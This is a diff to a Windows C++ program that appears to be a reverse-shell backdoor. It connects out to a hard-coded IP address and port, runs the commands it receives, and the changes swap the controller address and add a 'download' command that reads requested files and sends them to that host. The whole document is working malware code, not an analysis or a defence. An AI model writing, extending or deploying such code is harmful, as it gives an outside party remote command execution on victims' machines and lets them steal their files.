@@ -10,15 +10,6 @@
 
 using namespace std;
 
-string convertToString(char* a, int size)
-{
-	int i;
-	string s = "";
-	for (i = 0; i < size; i++) {
-		s = s + a[i];
-	}
-	return s;
-}
 
 std::tuple<string, string> execute(const std::string& command) {
 
@@ -29,6 +20,9 @@ std::tuple<string, string> execute(const std::string& command) {
 		_chdir(cd.c_str());
 		return make_tuple("cd \n", "");
 	}
+
+	
+
 	else{
 		char* buf = nullptr;
 		size_t sz = 0;
@@ -56,13 +50,104 @@ std::tuple<string, string> execute(const std::string& command) {
 	}
 }
 
+bool senddata(SOCKET sock, void* buf, int buflen)
+{
+	const char* pbuf = (const char*)buf;
+
+	while (buflen > 0)
+	{
+		int num = send(sock, pbuf, buflen, 0);
+		if (num == SOCKET_ERROR)
+		{
+			if (WSAGetLastError() == WSAEWOULDBLOCK)
+			{
+				// optional: use select() to check for timeout to fail the send
+				continue;
+			}
+			return false;
+		}
+
+		pbuf += num;
+		buflen -= num;
+	}
+
+	return true;
+}
+
+bool sendlong(SOCKET sock, long value)
+{
+	value = htonl(value);
+	return senddata(sock, &value, sizeof(value));
+}
+
+bool sendfile(SOCKET sock, FILE* f)
+{
+	fseek(f, 0, SEEK_END);
+	long filesize = ftell(f);
+	rewind(f);
+	if (filesize == EOF)
+		return false;
+	if (!sendlong(sock, filesize))
+		return false;
+	if (filesize > 0)
+	{
+		char buffer[1024];
+		do
+		{
+			size_t num = min(filesize, sizeof(buffer));
+			num = fread(buffer, 1, num, f);
+			if (num < 1)
+				return false;
+			if (!senddata(sock, buffer, num))
+				return false;
+			filesize -= num;
+		} while (filesize > 0);
+	}
+	return true;
+}
+
+void send_file(int sock, const char * filename) {
+	
+	cout << "Inside" << "\n";
+
+	// setting the variables
+	FILE* fp;
+	
+
+	cout << "Opening the file" << "\n";
+
+	// opening the file
+	fopen_s(&fp, filename, "rb");
+	
+
+	cout << "Starting the loop" << "\n";
+
+	int n;
+	char data[1024] = { 0 };
+
+	while (fgets(data, 1024, fp) != NULL) {
+		cout << "Sending " << data << "\n";
+		send(sock, data, sizeof(data), 0);
+		
+		ZeroMemory(data, 1024);
+	}
+	string lol = "sentt cOmpl3t3";
+	const char *lol2 = lol.c_str();
+	send(sock, lol2, 15, 0);
+
+
+}
+
 int main()
 {
     cout << "Hello World!\n";
 
    
-	string ip = "193.161.193.99";
-	int port = 44313;
+	/*string ip = "193.161.193.99";
+	int port = 44313;*/
+
+	string ip = "3.1.5.104";
+	int port = 4422;
 
 	int buffer = 256;
 
@@ -125,7 +210,26 @@ int main()
 
 		string cmd = string(buf);
 		
+		if (cmd.find("download ", 0) == 0) {
+			char buf3[4] = "ok";
+			char filename_buf[1024];
+			send(sock, buf3, 4, 0);
+			recv(sock, filename_buf, 1024, 0);
+
+			FILE* filehandle;
+			fopen_s(&filehandle, filename_buf, "rb");
+			if (filehandle != NULL)
+			{
+				sendfile(sock, filehandle);
+				fclose(filehandle);
+			}
+
 	
+	/*	cout << "ready to send file";
+		send_file(sock, filename_buf);*/
+		}
+		else{
+
 
 		string stdout1;
 		string stderr1;
@@ -171,7 +275,7 @@ int main()
 		recv(sock, temp_buf, 8, 0);
 
 		send(sock, tab2, i + 1, 0);
-
+		}
 	}
 
 	// close socket
